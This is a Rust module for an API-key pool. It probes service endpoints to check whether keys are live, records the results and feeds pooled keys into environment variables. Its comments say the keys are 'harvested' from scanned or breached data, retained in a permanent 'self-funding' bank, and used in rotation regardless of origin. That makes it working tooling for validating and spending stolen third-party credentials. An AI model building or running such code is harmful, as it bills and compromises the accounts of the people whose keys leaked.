//! Key validation: async endpoint-probe and add-and-validate helpers.

use std::time::Duration;

use super::pool::KeyPool;
use super::types::{KeyEntry, KeyStatus};
use crate::util::service_defs::{KeyPlacement, ServiceDef, find_service};

/// Add a key and validate it immediately against the service endpoint.
/// If valid, marks it Active and stores it. If invalid, marks it Invalid
/// but still stores it (won't be used by next_key). Returns true if the key is
/// valid.
///
/// When the key is already pooled in an unsettled state (Untested / Exhausted /
/// RateLimited), the fresh live verdict is written back to the existing entry, so
/// a proven-live harvested key never lingers as Untested and the validate-once
/// cache is honoured on subsequent calls (no wasted quota re-confirming it). A
/// successful confirmation also corroborates the key (a proven credential ranks
/// healthier and is retained preferentially — the self-funding signal) and is
/// recorded in the retention bank as a verified duplicate.
///
/// `discovered_by` records provenance for `keys list` reporting: pass
/// `Some(source)` for a key that came from imported/scanned data, `None` for an
/// operator-provisioned key. It is visibility metadata only — it does not gate
/// selection (a usable pooled key is reusable regardless of origin).
pub async fn add_and_validate(
    service: &str,
    key_value: &str,
    notes: Option<String>,
    discovered_by: Option<String>,
) -> bool {
    let pool = super::global_pool();

    // Validate once: if the pool already holds this exact key with a settled
    // verdict, don't re-probe it. Re-running an import (or any repeated add)
    // must not spend the operator's quota re-confirming a known-good (Active)
    // or known-bad (Invalid/Revoked) credential. Untested / Exhausted /
    // RateLimited are unsettled, so they fall through to a fresh live check.
    if let Some(status) = pool.entry_status(service, key_value) {
        match status {
            KeyStatus::Active => return true,
            KeyStatus::Invalid | KeyStatus::Revoked => return false,
            KeyStatus::Untested | KeyStatus::Exhausted | KeyStatus::RateLimited => {}
        }
    }

    let mut entry = KeyEntry::new(key_value);
    entry.notes = notes;
    // Provenance: record where a discovered key came from, for `keys list`
    // reporting. Visibility metadata only — it does not gate selection
    // (`next_key` ignores `discovered_by`).
    if discovered_by.is_some() {
        entry.discovered_at = Some(crate::core::entity::unix_now());
        entry.discovered_by = discovered_by;
    }

    let Some(valid) = validate_key(service, key_value).await else {
        // No validator for this service: store the key as-is (Untested) so it is
        // still available to the rotation, and persist.
        pool.add(service, entry);
        super::persistence::save_pool_best_effort(&pool);
        return false;
    };

    entry.status = if valid {
        KeyStatus::Active
    } else {
        KeyStatus::Invalid
    };
    entry.last_validated = Some(crate::core::entity::unix_now());
    if valid {
        // A live confirmation is an independent corroboration: a proven key ranks
        // healthier and is retained preferentially by the pool — the self-funding
        // signal that biases rotation toward credentials known to work.
        entry.record_corroboration();
    }

    let newly_added = pool.add(service, entry);
    if !newly_added {
        // The key was already pooled in an unsettled state (Untested / Exhausted /
        // RateLimited): `add` folded this observation in as corroboration but kept
        // the OLD status. Settle it to the fresh live verdict so a proven-live
        // harvested key stops reading as Untested and the validate-once cache is
        // honoured on the next call.
        pool.mark_validated(service, key_value, valid);
    }
    super::persistence::save_pool_best_effort(&pool);

    if valid {
        // Durable retention backstop: mirror the proven key into the PERMANENT
        // bank so the self-funding inventory survives loss of the JSON pool and is
        // available for future cross-reference. INSERT-OR-IGNORE, so a key already
        // banked from a breach keeps its real provenance untouched. Retaining the
        // row first also guarantees the verified-duplicate accrual below lands
        // (record_verification only updates an existing row).
        crate::util::key_vault::retain_pool_key(service, key_value);
        let _ = crate::util::key_vault::record_verification(key_value);
        tracing::info!(service, "validated and stored API key");
    } else {
        tracing::warn!(service, "API key failed validation — stored as invalid");
    }
    valid
}

pub async fn validate_key(service: &str, key: &str) -> Option<bool> {
    let sdef = find_service(service)?;
    let result = validate_against_endpoint(sdef, key).await;
    Some(result)
}

/// Escape a value for a curl `--config` double-quoted argument.
///
/// curl's config parser unescapes `\\`, `\"`, `\t`, `\n`, `\r`, `\v` inside a
/// quoted value. Escaping backslash/quote stops the secret breaking out of the
/// quoting; escaping the line terminators stops a stray control byte in a key
/// from prematurely ending the directive (a multi-line value is otherwise a
/// parse error). The result is wrapped in double quotes by the caller.
pub(super) fn curl_config_escape(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    for c in value.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '\t' => out.push_str("\\t"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            _ => out.push(c),
        }
    }
    out
}

async fn validate_against_endpoint(sdef: &ServiceDef, key: &str) -> bool {
    use tokio::io::AsyncWriteExt;

    let timeout_ms = 10_000u64;
    let secs = (timeout_ms / 1000).to_string();

    // Build the curl config that carries the secret. Every directive that
    // embeds the key — the auth header, the basic-auth credential, or the
    // query-string URL — goes here and is fed to curl over stdin via
    // `--config -`, NOT on the command line. The argv of a process is
    // world-readable through `/proc/<pid>/cmdline`, so a `-H "X: <key>"` or
    // `-u <key>` argument leaks the credential to any other local UID for the
    // lifetime of the probe; the config-on-stdin path keeps it off argv.
    let mut config = String::new();
    match sdef.key_header {
        KeyPlacement::QueryParam(param) => {
            // Percent-encode the key before it enters the query string: an
            // unencoded `&`, `#`, `+`, or space would otherwise split the
            // parameter or corrupt the value, mis-probing the endpoint.
            let enc = crate::util::http::urlencode(key);
            let url = if sdef.test_url.contains('?') {
                if sdef.test_url.ends_with('=') {
                    format!("{}{}", sdef.test_url, enc)
                } else {
                    format!("{}&{}={}", sdef.test_url, param, enc)
                }
            } else {
                format!("{}?{}={}", sdef.test_url, param, enc)
            };
            config.push_str(&format!("url = \"{}\"\n", curl_config_escape(&url)));
        }
        KeyPlacement::Header(header) => {
            config.push_str(&format!(
                "url = \"{}\"\n",
                curl_config_escape(sdef.test_url)
            ));
            config.push_str(&format!(
                "header = \"{}\"\n",
                curl_config_escape(&format!("{header}: {key}"))
            ));
        }
        KeyPlacement::BasicAuth => {
            config.push_str(&format!(
                "url = \"{}\"\n",
                curl_config_escape(sdef.test_url)
            ));
            config.push_str(&format!("user = \"{}\"\n", curl_config_escape(key)));
        }
        KeyPlacement::BearerAuth => {
            config.push_str(&format!(
                "url = \"{}\"\n",
                curl_config_escape(sdef.test_url)
            ));
            config.push_str(&format!(
                "header = \"{}\"\n",
                curl_config_escape(&format!("Authorization: bearer {key}"))
            ));
        }
    }

    let mut cmd = tokio::process::Command::new("curl");
    cmd.args([
        "-s",
        "-o",
        "/dev/null",
        "-w",
        "%{http_code}",
        "--max-time",
        &secs,
        // Read the secret-bearing directives from stdin, not argv.
        "--config",
        "-",
    ]);
    cmd.stdin(std::process::Stdio::piped());
    cmd.stdout(std::process::Stdio::piped());
    cmd.stderr(std::process::Stdio::null());
    cmd.kill_on_drop(true);

    let run = async {
        let mut child = cmd.spawn().ok()?;
        // Write the config and close stdin so curl sees EOF. The payload is a
        // few short lines — far under the pipe buffer — so writing it in full
        // before reading stdout cannot deadlock.
        let mut stdin = child.stdin.take()?;
        stdin.write_all(config.as_bytes()).await.ok()?;
        stdin.shutdown().await.ok()?;
        drop(stdin);
        child.wait_with_output().await.ok()
    };

    let output = tokio::time::timeout(Duration::from_millis(timeout_ms + 2000), run)
        .await
        .ok()
        .flatten();

    let Some(output) = output else { return false };
    let code = String::from_utf8_lossy(&output.stdout);
    let code = code.trim();
    matches!(code, "200" | "201" | "204" | "301" | "302")
}

/// Merge pool keys into an env-var map, filling any gaps.
pub fn merge_pool_into_env(pool: &KeyPool, keys: &mut std::collections::HashMap<String, String>) {
    let defs = crate::util::service_defs::service_defs();
    for sdef in defs {
        if keys.contains_key(sdef.env_var) {
            continue;
        }
        if let Some(val) = pool.next_key(sdef.name) {
            keys.insert(sdef.env_var.to_string(), val);
        }
    }
}
